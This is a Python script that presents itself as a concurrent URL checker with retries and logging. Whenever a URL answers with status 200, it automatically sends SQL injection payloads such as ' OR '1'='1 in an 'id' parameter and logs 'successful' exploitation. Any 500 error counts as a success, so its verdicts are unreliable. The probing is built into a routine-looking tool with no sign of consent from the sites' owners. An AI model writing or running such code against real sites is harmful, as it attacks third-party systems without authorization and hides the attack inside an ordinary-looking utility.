import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import re
import time

# Set up logging to output to a file
logging.basicConfig(filename='url_check.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Function to handle URL checking with retries and logging
def check_url(url, max_retries=3):
    # URL validation
    if not re.match(r'^https?://[^\s/$.?#].[^\s]*$', url):
        print(f"Skipping invalid URL: {url} (Must start with http or https and include a valid domain)")
        logging.warning(f"Invalid URL: {url}")
        return
    
    retries = 0
    while retries < max_retries:
        try:
            # Request with redirect handling
            response = requests.get(url, allow_redirects=True, timeout=10)
            
            # Print and log results
            result = f"\nChecking URL: {url}"
            if response.history:  # Check if there was a redirect
                result += f"\nRedirected from {response.url} to {response.history[-1].url}"
            if response.status_code == 200:
                result += f"\nSuccess! Status Code: {response.status_code}"
                # Attempt SQL Injection Exploit
                exploit_sql_injection(url)
            elif response.status_code == 301:
                result += "\nMoved Permanently"
            elif response.status_code == 302:
                result += "\nFound - redirect"
            elif response.status_code == 404:
                result += "\nError 404: Page not found"
            elif response.status_code == 403:
                result += "\nError 403: Permission Denied"
            elif response.status_code == 500:
                result += "\nError 500: Internal Server Error"
            else:
                result += f"\nReceived unexpected status code {response.status_code}"

            print(result)
            logging.info(result)
            break  # Exit loop on success

        except requests.exceptions.RequestException as e:
            retries += 1
            if retries >= max_retries:
                print(f"Error making request to {url}: {e}")
                logging.error(f"Failed to reach {url} after {max_retries} attempts: {e}")
            else:
                print(f"Retrying ({retries}/{max_retries}) for {url}")
                time.sleep(2)  # Wait before retrying

# Exploit function for SQL Injection
def exploit_sql_injection(url):
    """
    Attempts SQL Injection by modifying a common parameter with a SQL payload.
    """
    payloads = ["' OR '1'='1", "' OR 'a'='a"]
    vulnerable = False
    
    for payload in payloads:
        exploit_url = f"{url}?id={payload}"
        print(f"Attempting SQL Injection on {exploit_url}")
        
        try:
            response = requests.get(exploit_url, timeout=10)
            
            # Check for signs of SQL Injection vulnerability
            if "SQL syntax" in response.text or response.status_code == 500:
                logging.info(f"Successful SQL Injection on {exploit_url} with payload {payload}")
                print(f"Exploitation successful on {exploit_url}")
                vulnerable = True
                break  # Exit loop on success
            else:
                print(f"No SQL Injection vulnerability detected on {exploit_url}")
        
        except requests.exceptions.RequestException as e:
            print(f"Error during exploitation attempt on {exploit_url}: {e}")
            logging.error(f"Failed exploitation attempt on {exploit_url}: {e}")
    
    if not vulnerable:
        logging.info(f"No SQL Injection vulnerability detected for {url}")

# Function to handle multiple URLs concurrently
def check_urls_concurrently(url_list):
    with ThreadPoolExecutor(max_workers=5) as executor:
        # Submit tasks to be executed concurrently
        future_to_url = {executor.submit(check_url, url): url for url in url_list}
        
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                future.result()  # This will re-raise any exception caught in check_url
            except Exception as exc:
                print(f"{url} generated an exception: {exc}")
                logging.error(f"Exception occurred for {url}: {exc}")

# Main logic to take input and call the function
urls_input = input("Enter URLs separated by commas: ")

# Split input by comma and strip whitespace
urls = [url.strip() for url in urls_input.split(",")]

# Call the function to check URLs concurrently
check_urls_concurrently(urls)
